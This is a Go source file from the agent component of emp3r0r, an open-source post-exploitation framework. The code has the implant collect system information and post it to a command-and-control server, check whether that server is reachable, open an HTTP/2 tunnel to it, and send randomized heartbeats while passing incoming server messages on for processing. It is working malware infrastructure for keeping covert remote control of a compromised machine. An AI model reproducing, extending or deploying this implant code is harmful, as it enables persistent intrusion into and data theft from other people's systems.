package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// CheckIn poll CC server and report its system info
func CheckIn() error {
	info := CollectSystemInfo()

	sysinfoJSON, err := json.Marshal(info)
	if err != nil {
		return err
	}
	_, err = emp3r0r_data.HTTPClient.Post(emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
	if err != nil {
		return err
	}
	return nil
}

// IsCCOnline check RuntimeConfig.CCIndicator
func IsCCOnline(proxy string) bool {
	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		// We use ABSURDLY large keys, and should probably not.
		TLSHandshakeTimeout: 60 * time.Second,
	}
	if proxy != "" && strings.HasPrefix(emp3r0r_data.Transport, "HTTP2") {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			log.Fatalf("Invalid proxy: %v", err)
		}
		t.Proxy = http.ProxyURL(proxyUrl)
		log.Printf("IsCCOnline: using proxy %s", proxy)
	}
	client := http.Client{
		Transport: t,
		Timeout:   30 * time.Second,
	}
	resp, err := client.Get(RuntimeConfig.CCIndicator)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
		return false
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
		return false
	}
	defer resp.Body.Close()

	log.Printf("Checking CCIndicator (%s) for %s", RuntimeConfig.CCIndicator, strconv.Quote(RuntimeConfig.CCIndicatorText))
	return strings.Contains(string(data), RuntimeConfig.CCIndicatorText)
}

func catchInterruptAndExit(cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	log.Println("Cancelling due to interrupt")
	cancel()
	os.Exit(0)
}

// ConnectCC connect to CC with h2conn
func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	var (
		resp *http.Response
	)
	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}

	log.Printf("ConnectCC: connecting to %s", url)
	conn, resp, err = h2.Connect(ctx, url)
	if err != nil {
		log.Printf("Initiate conn: %s", err)
		return
	}

	// Check server status code
	if resp.StatusCode != http.StatusOK {
		log.Printf("Bad status code: %d", resp.StatusCode)
		return
	}

	return
}

// CCMsgTun use the connection (CCConn)
func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
	var (
		in  = json.NewDecoder(emp3r0r_data.H2Json)
		out = json.NewEncoder(emp3r0r_data.H2Json)
		msg emp3r0r_data.MsgTunData // data being exchanged in the tunnel
	)
	go catchInterruptAndExit(cancel)
	defer func() {
		err = emp3r0r_data.H2Json.Close()
		if err != nil {
			log.Print("CCMsgTun closing: ", err)
		}

		cancel()
		log.Print("CCMsgTun closed")
	}()

	// check for CC server's response
	go func() {
		log.Println("Check CC response: started")
		for ctx.Err() == nil {
			// read response
			err = in.Decode(&msg)
			if err != nil {
				log.Print("Check CC response: JSON msg decode: ", err)
				break
			}
			payload := msg.Payload
			if strings.HasPrefix(payload, "hello") {
				continue
			}

			// process CC data
			go processCCData(&msg)
		}
		log.Println("Check CC response: exited")
	}()

	sendHello := func(cnt int) bool {
		// try cnt times then exit
		for cnt > 0 {
			cnt-- // consume cnt

			// send hello
			msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
			msg.Tag = RuntimeConfig.AgentTag
			err = out.Encode(msg)
			if err != nil {
				log.Printf("agent cannot connect to cc: %v", err)
				util.TakeASnap()
				continue
			}
			return true
		}
		return false
	}

	// send hello every second
	for ctx.Err() == nil {
		if !sendHello(util.RandInt(1, 10)) {
			log.Print("sendHello failed")
			break
		}
		err = CheckIn()
		if err != nil {
			log.Printf("Updating agent sysinfo: %v", err)
		}
		util.TakeASnap()
	}

	if err == nil {
		err = errors.New("CC disconnected")
	}
	if ctx.Err() != nil {
		err = fmt.Errorf("ctx: %v\nerr: %v", ctx.Err(), err)
	}
	return err
}
